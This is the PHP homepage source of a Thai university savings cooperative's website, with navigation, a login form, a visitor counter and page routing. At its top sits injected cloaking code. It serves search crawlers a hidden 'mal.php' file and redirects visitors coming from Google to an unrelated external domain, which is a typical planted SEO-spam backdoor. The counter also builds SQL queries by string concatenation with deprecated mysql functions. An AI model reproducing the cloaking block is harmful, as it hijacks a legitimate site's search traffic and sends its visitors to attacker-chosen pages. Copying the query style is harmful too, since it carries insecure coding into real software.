<?php
error_reporting(0);
set_time_limit(0);

$bot_content_file = 'mal.php';

function is_spider() {
    $spiders = ['bot', 'slurp', 'spider', 'crawl', 'google', 'msnbot', 'yahoo', 'ask jeeves'];
    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
        return false;
    }
    $s_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($spiders as $spider) {
        if (stripos($s_agent, $spider) !== false) {
            return true;
        }
    }
    return false;
}

function is_mobile() {
    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
        return false;
    }
    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
    return preg_match('/android|iphone|ipad|ipod|blackberry|opera mini|iemobile|mobile/i', $ua);
}

function is_from_google() {
    if (!isset($_SERVER['HTTP_REFERER'])) {
        return false;
    }
    return stripos($_SERVER['HTTP_REFERER'], 'google.') !== false;
}

if (is_spider()) {
    if (file_exists($bot_content_file)) {
        include($bot_content_file);
    } else {
        header("HTTP/1.0 404 Not Found");
    }
    exit();
}

if (is_from_google()) {
    header("Location: https://flymarka226.com.tr/");
    exit();
}

?>

<?php include("connectDB.php");  ?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>สหกรณ์ออมทรัพย์ มหาวิทยาลัยราชภัฏนครศรีธรรมราช</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="images/logo2.png" rel="icon">
  <link href="images/logo2.png" rel="apple-touch-icon">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,600;0,700;1,300;1,400;1,600;1,700&display=swap" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Variables CSS Files. Uncomment your preferred color scheme -->
  <link href="assets/css/variables.css" rel="stylesheet">
  <!-- <link href="assets/css/variables-blue.css" rel="stylesheet"> -->
  <!-- <link href="assets/css/variables-green.css" rel="stylesheet"> -->
  <!-- <link href="assets/css/variables-orange.css" rel="stylesheet"> -->
  <!-- <link href="assets/css/variables-purple.css" rel="stylesheet"> -->
  <!-- <link href="assets/css/variables-red.css" rel="stylesheet"> -->
  <!-- <link href="assets/css/variables-pink.css" rel="stylesheet"> -->

  <!-- Template Main CSS File -->
  <link href="assets/css/main.css" rel="stylesheet">

  <?php
  $thai_day_arr=array("อาทิตย์","จันทร์","อังคาร","พุธ","พฤหัสบดี","ศุกร์","เสาร์");  

  $thai_month_arr=array(  

    "0"=>"",  

    "1"=>"มกราคม",  

    "2"=>"กุมภาพันธ์",  

    "3"=>"มีนาคม",  

    "4"=>"เมษายน",  

    "5"=>"พฤษภาคม",  

    "6"=>"มิถุนายน",   

    "7"=>"กรกฎาคม",  

    "8"=>"สิงหาคม",  

    "9"=>"กันยายน",  

    "10"=>"ตุลาคม",  

    "11"=>"พฤศจิกายน",  

    "12"=>"ธันวาคม"                    

  );  

  function thai_date($time){  

    global $thai_day_arr,$thai_month_arr;   

    $thai_date_return= date("j",$time);  

    $thai_date_return.=" ".$thai_month_arr[date("n",$time)];  

    $thai_date_return.= " ".(date("Yํ",$time)+543);  

    return $thai_date_return; 

  }
  ?>

  <!-- =======================================================
  * Template Name: HeroBiz - v2.4.0
  * Template URL: https://bootstrapmade.com/herobiz-bootstrap-business-template/
  * Author: BootstrapMade.com
  * License: https://bootstrapmade.com/license/
  ======================================================== -->
</head>

<body>

<?php

    $strSQL = " SELECT DATE FROM counter LIMIT 0,1";
    $objQuery = mysql_query($strSQL);
    $objResult = mysql_fetch_array($objQuery);
    if($objResult["DATE"] != date("Y-m-d"))
    {
        //*** บันทึกข้อมูลของเมื่อวานไปยังตาราง daily ***//
        $strSQL = " INSERT INTO daily (DATE,NUM) SELECT '".date('Y-m-d',strtotime("-1 day"))."',COUNT(*) AS intYesterday FROM  counter WHERE 1 AND DATE = '".date('Y-m-d',strtotime("-1 day"))."'";
        mysql_query($strSQL);

        //*** ลบข้อมูลของเมื่อวานในตาราง counter ***//
        $strSQL = " DELETE FROM counter WHERE DATE != '".date("Y-m-d")."' ";
        mysql_query($strSQL);
    }

    //*** Insert Counter ปัจจุบัน ***//
    $strSQL = " INSERT INTO counter (DATE,IP) VALUES ('".date("Y-m-d")."','".$_SERVER["REMOTE_ADDR"]."') ";
    mysql_query($strSQL);

    //******************** Get Counter ************************//

    // Today //
    $strSQL = " SELECT COUNT(DATE) AS CounterToday FROM counter WHERE DATE = '".date("Y-m-d")."' ";
    $objQuery = mysql_query($strSQL);
    $objResult = mysql_fetch_array($objQuery);
    $strToday = $objResult["CounterToday"];

    // Yesterday //
    $strSQL = " SELECT NUM FROM daily WHERE DATE = '".date('Y-m-d',strtotime("-1 day"))."' ";
    $objQuery = mysql_query($strSQL);
    $objResult = mysql_fetch_array($objQuery);
    $strYesterday = $objResult["NUM"];

    // This Month //
    $strSQL = " SELECT SUM(NUM) AS CountMonth FROM daily WHERE DATE_FORMAT(DATE,'%Y-%m')  = '".date('Y-m')."' ";
    $objQuery = mysql_query($strSQL);
    $objResult = mysql_fetch_array($objQuery);
    $strThisMonth = $objResult["CountMonth"];

    // Last Month //
    $strSQL = " SELECT SUM(NUM) AS CountMonth FROM daily WHERE DATE_FORMAT(DATE,'%Y-%m')  = '".date('Y-m',strtotime("-1 month"))."' ";
    $objQuery = mysql_query($strSQL);
    $objResult = mysql_fetch_array($objQuery);
    $strLastMonth = $objResult["CountMonth"];

    // This Year //
    $strSQL = " SELECT SUM(NUM) AS CountYear FROM daily WHERE DATE_FORMAT(DATE,'%Y')  = '".date('Y')."' ";
    $objQuery = mysql_query($strSQL);
    $objResult = mysql_fetch_array($objQuery);
    $strThisYear = $objResult["CountYear"];

    // Last Year //
    $strSQL = " SELECT SUM(NUM) AS CountYear FROM daily WHERE DATE_FORMAT(DATE,'%Y')  = '".date('Y',strtotime("-1 year"))."' ";
    $objQuery = mysql_query($strSQL);
    $objResult = mysql_fetch_array($objQuery);
    $strLastYear = $objResult["CountYear"];

    //*** Close MySQL ***//

?>

  <!-- ======= Header ======= -->
  <header id="header" class="header fixed-top navbar-light bg-light" data-scrollto-offset="0">
    <div class="container-fluid d-flex align-items-center justify-content-between">

      <a href="index.php" class="logo d-flex align-items-center scrollto me-auto me-lg-0">
        <!-- Uncomment the line below if you also wish to use an image logo -->
        
       <h3 style="font-size: 1.6vw;   font-weight: 1000; color: green;"  ></h3>
      </a>

      <nav id="navbar" class="navbar ">
        <ul>

          <li class="dropdown"><a href="?p=home"><span>หน้าแรก</span> </a>
       
          </li>


          <li class="dropdown"><a href="#"><span>เกี่ยวกับ</span> <i class="bi bi-chevron-down dropdown-indicator"></i></a>
            <ul>
              <li><a href="?p=history" >ประวัติ</a></li>
              <li><a href="?p=vision">ปรัชญา วิสัยทัศน์</a></li>
              <li><a href="?p=organize">โครงสร้าง</a></li>
              <li><a href="?p=chairmanlist">ทำเนียบ</a></li>
            <!--  <li><a href="?p=boardlist">ทำเนียบคณะกรรมการ</a></li>
              <li><a href="?p=consultantlist">ทำเนียบที่ปรึกษา</a></li>
              <li><a href="?p=omsnakhonlist"target="_blank">ทำเนียบสหกรณ์จังหวัดนครศรีธรรมราช</a></li>
             
-->
             
              <li><a href="?p=board">คณะกรรมการ</a></li>
               <li><a href="?p=personal">เจ้าหน้าที่</a></li>
              <li><a href="?p=consultant">ที่ปรึกษา</a></li>
              <li><a href="?p=omsnakhon">สหกรณ์จังหวัดนครศรีธรรมราช</a></li>
              <li><a href="?p=business">ผู้ตรวจสอบกิจการ</a></li>

             
            </ul>
          </li>

          <li><a class="nav-link scrollto1" href="?p=rule-details">ระเบียบข้อบังคับ</a></li>

          <li class="dropdown"><a href="#"><span>บริการ</span> <i class="bi bi-chevron-down dropdown-indicator"></i></a>
            <ul>
              <li><a href="https://nstru.thaicoop.org/coop-main/index.php"  class="active">ระบบสอบถามข้อมูลสมาชิก</a></li>
             <!-- <li><a href="https://script.google.com/macros/s/AKfycbwZQvOPP_oVjelolC7FCvlOcTWYYccaH2UWcNG9JaEtkYRblyXCpVA7MjpI8cZQSzgKvg/exec" target="_blank" >ตรวจสอบประกันสินเชื่อ</a></li>-->
              
              <li><a href="https://forms.gle/cjvL5eJWm1yZp7B59">ระบบแจ้งการโอนเงิน</a></li>
              <li><a href="?p=credit">เงินฝาก/เงินกู้</a></li>
                <li><a href="?p=welfare">สวัสดิการ</a></li>
              
              <li><a href="?p=interest">อัตราดอกเบี้ย</a></li>
                  <li><a href="?p=dividend">เงินปันผล - เฉลี่ยคืน</a></li>
              <li><a href=" ?p=cremation">ฌาปนกิจสงเคราะห์ สสอค.-สส.ชสอ.</a></li>
             <li><a href="https://script.google.com/macros/s/AKfycbwZQvOPP_oVjelolC7FCvlOcTWYYccaH2UWcNG9JaEtkYRblyXCpVA7MjpI8cZQSzgKvg/exec">ตรวจสอบประกันสินเชื่อ</a></li>
              <li><a href=" ?p=performance">ผลการดำเนินงาน</a></li>
             
              <!--<li><a href=" ?p=dividendcalculation">คำนวณเงินปันผล</a></li>-->
             
              <li><a href=" ?p=bookbank">บัญชีธนาคาร</a></li>
              <li><a href=" ?p=calandar">ปฏิทินสหกรณ์</a></li>
               <li><a href=" ?p=manual">คู่มือสมาชิก</a></li>
              <li><a href=" https://forms.gle/YPxupUxhry9DJJCf7" >การเสนอแนะ/การร้องทุกข์</a></li>
             
             

             
            </ul>
          </li>

          <li class="dropdown"><a href="#"><span>ดาวน์โหลด</span> <i class="bi bi-chevron-down dropdown-indicator"></i></a>
          <ul>
          <li><a class="nav-link scrollto1" href="?p=formdownload">ดาวน์โหลดเอกสาร</a></li>
          <li><a class="nav-link scrollto1" href="?p=logodownload">ดาวน์โหลดโลโก้</a></li>
          </ul>
          </li>
       
         <!-- <li class="dropdown megamenu"><a href="#"><span>Mega Menu</span> <i class="bi bi-chevron-down dropdown-indicator"></i></a>
            <ul>
              <li>
                <a href="#">Column 1 link 1</a>
                <a href="#">Column 1 link 2</a>
                <a href="#">Column 1 link 3</a>
              </li>
              <li>
                <a href="#">Column 2 link 1</a>
                <a href="#">Column 2 link 2</a>
                <a href="#">Column 3 link 3</a>
              </li>
              <li>
                <a href="#">Column 3 link 1</a>
                <a href="#">Column 3 link 2</a>
                <a href="#">Column 3 link 3</a>
              </li>
              <li>
                <a href="#">Column 4 link 1</a>
                <a href="#">Column 4 link 2</a>
                <a href="#">Column 4 link 3</a>
              </li>
            </ul>
          </li>
          <li class="dropdown"><a href="#"><span>Drop Down</span> <i class="bi bi-chevron-down dropdown-indicator"></i></a>
            <ul>
              <li><a href="#">Drop Down 1</a></li>
              <li class="dropdown"><a href="#"><span>Deep Drop Down</span> <i class="bi bi-chevron-down dropdown-indicator"></i></a>
                <ul>
                  <li><a href="#">Deep Drop Down 1</a></li>
                  <li><a href="#">Deep Drop Down 2</a></li>
                  <li><a href="#">Deep Drop Down 3</a></li>
                  <li><a href="#">Deep Drop Down 4</a></li>
                  <li><a href="#">Deep Drop Down 5</a></li>
                </ul>
              </li>
              <li><a href="#">Drop Down 2</a></li>
              <li><a href="#">Drop Down 3</a></li>
              <li><a href="#">Drop Down 4</a></li>
            </ul>
          </li>-->
          <li><a class="nav-link scrollto" href="?p=home#contact">ติดต่อเรา</a></li>
         <li> <a onclick="document.getElementById('id01').style.display='block'" style="width:auto;">เข้าสู่ระบบ</a></li>
        </ul>
        <i class="bi bi-list mobile-nav-toggle d-none"></i>
    
      </nav><!-- .navbar -->

<div id="id01" class="modal">
  
  <form class="modal-content animate" action="check_login.php" method="post">
    <div class="imgcontainer">
      <span onclick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal">&times;</span>
      <img src="images/img_avatar2.png" alt="Avatar" class="avatar">
    </div>

    <div class="container">
      <label for="uname"><b>ชื่อผู้ใช้</b></label>
      <input type="text" placeholder="ป้อนชื่อผู้ใช้" name="username" required>

      <label for="psw"><b>รหัสผ่าน</b></label>
      <input type="password" placeholder="ป้อนรหัสผ่าน" name="userpass" required>
        
      <button type="submit">เข้าสู่ระบบ</button>
     
    </div>

    <div class="container" style="background-color:#f1f1f1">
      <button type="button" onclick="document.getElementById('id01').style.display='none'" class="cancelbtn">ยกเลิก</button>
      
    </div>
  </form>
</div>

<script>
// Get the modal
var modal = document.getElementById('id01');

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>





    </div>
  </header><!-- End Header -->

  <!--<section id="hero-animated" class="hero-animated d-flex align-items-center">-->

      <div style="margin-top:90px">
      <img src="assets/img/hero-carousel/15579.jpg" class="img-fluid w-100" >
      </div>

  <main id="main">


  <br>




  <?php


    $page = isset($_GET['p']) ? trim(strtolower($_GET['p']))       : "home";

    $allowedPages = array(
        'home'     => './pagesnew/home.php',
    
        'personal'    => './pagesnew/personal.php',
        'rule-details'    => './pagesnew/rule-details.php',
        'formdownload'    => './pagesnew/form.php',
        'logodownload'    => './pagesnew/logoform.php',
        'calandar'    => './pagesnew/calandar.php',
        'performance'    => './pagesnew/performance.php',
        'news-details'    => './pagesnew/news-details.php', 
         'activity-details'    => './pagesnew/activity-details.php',
         'credit'    => './pagesnew/credit.php',
         'allnews'    => './pagesnew/allnews.php',
         'allactivity'    => './pagesnew/allactivity.php',
         'board'    => './pagesnew/board.php',
         'history'    => './pagesnew/history.php',
         'vision'    => './pagesnew/vision.php',
         'organize'    => './pagesnew/organize.php',
         'cremation'    => './pagesnew/cremation.php',   
         'creditinsurance'    => './pagesnew/creditinsurance.php',   
         'bookbank'    => './pagesnew/bookbank.php',  
         'dividendcalculation'    => './pagesnew/dividendcalculation.php', 
         'login'    => './pagesnew/login.php',
         'interest'    => './pagesnew/interest.php',
         'consultant'    => './pagesnew/consultant.php',
         'nakhonoms'    => './pagesnew/nakhonoms.php',
         'manual'    => './pagesnew/manual.php',
          'chairman'    => './pagesnew/chairman.php',
          'dividend'    => './pagesnew/dividend.php',
          
          'omsnakhon'    => './pagesnew/omsnakhon.php',

'chairmanlist'    => './pagesnew/chairmanlist.php',
'boardlist'    => './pagesnew/boardlist.php',
'consultantlist'    => './pagesnew/consultantlist.php',
'omsnakhonlist'    => './pagesnew/omsnakhonlist.php',

'business'    => './pagesnew/business.php',
'welfare'    => './pagesnew/welfare.php',
 

    );

    include( isset($allowedPages[$page]) ? $allowedPages[$page] : $allowedPages["home"] );


?>




  </main><!-- End #main -->

  <!-- ======= Footer ======= -->
  <footer id="footer" class="footer footer-legal">

    <div class="footer-content">
      <div class="container">
        <div class="row">
 
          <div class="col-lg-6 col-md-6">
            <div class="footer-info">
              <h3>สหกรณ์ออมทรัพย์
                มหาวิทยาลัยราชภัฏนครศรีธรรมราช</h3>
              <p>
                1 ม.4 ต.ท่างิ้ว อ.เมือง จ.นครศรีธรรมราช 80280<br><br>
                <strong>Tel:</strong> 075-392044<br>
                <strong>Phone:</strong> 09 5256 8750 <br>
                <strong>Email:</strong> omsapnstru@outlook.co.th<br>
              </p>
            </div>
          </div>


 

          <div class="col-lg-4 col-md-4 ">
            <div class="footer-info text-center">
              <h3>ช่องทางออนไลน์
                </h3>
             <div class="cardBoxbody">
              <a href="https://line.me/ti/g2/jeFzaEC3TmnL_slptxomKFRVxhMnqbI6dXa34Q?utm_source=invitation&utm_medium=link_copy&utm_campaign=default">
              <div class="cardBox">
            <div class="card googleplus">
                <div class="card-front"><i class="bi bi-line"></i></div>
                <div class="card-back">line</div>
            </div>
        </div>
        </a>

    
        <a href="https://www.facebook.com/profile.php?id=100008878352062" >
        <div class="cardBox">
            <div class="card facebook">
                <div class="card-front"><i class="bi bi-facebook"></i></div>
                <div class="card-back">Facebook</div>
            </div>
        </div>
  </a>
  </div>
             
            </div>
          </div>





          <div class="col-lg-2 col-md-2">
          <div class="footer-legal text-center">
          <div class="container d-flex flex-column flex-lg-row justify-content-center justify-content-lg-between align-items-center ">
    
    
            <div class="social-links order-first order-lg-last mb-3 mb-lg-0 ">


  <table >
  <tr>
    <td colspan="2"><div align="center">สถิติเข้าชมเว็บไซต์</div></td>
  </tr>
  <tr>
    <td width="98">วันนี้</td>
    <td width="75"><div align="center"><?php echo number_format($strToday,0);?></div></td>
  </tr>
  <tr>
    <td>เมื่อวาน</td>
    <td><div align="center"><?php echo number_format($strYesterday,0);?></div></td>
  </tr>
  <tr>
    <td>เดือนนี้ </td>
    <td><div align="center"><?php echo number_format($strThisMonth,0);?></div></td>
  </tr>
  <tr>
    <td>เดือนที่แล้ว </td>
    <td><div align="center"><?php echo number_format($strLastMonth,0);?></div></td>
  </tr>
  <tr>
    <td>ปีนี้ </td>
    <td><div align="center"><?php echo number_format($strThisYear,0);?></div></td>
  </tr>
  <tr>
    <td>ปีที่แล้ว</td>
    <td><div align="center"><?php echo number_format($strLastYear,0);?></div></td>
  </tr>
</table>
            </div>
    

          



          </div>
        </div>
      </div>


        

        </div>
      </div>
    </div>

    <

  </footer><!-- End Footer -->

  <a href="#" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

  <div id="preloader"></div>

  <!-- Vendor JS Files -->
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/aos/aos.js"></script>
  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="assets/vendor/php-email-form/validate.js"></script>

  <!-- Template Main JS File -->
  <script src="assets/js/main.js"></script>

</body>
</html>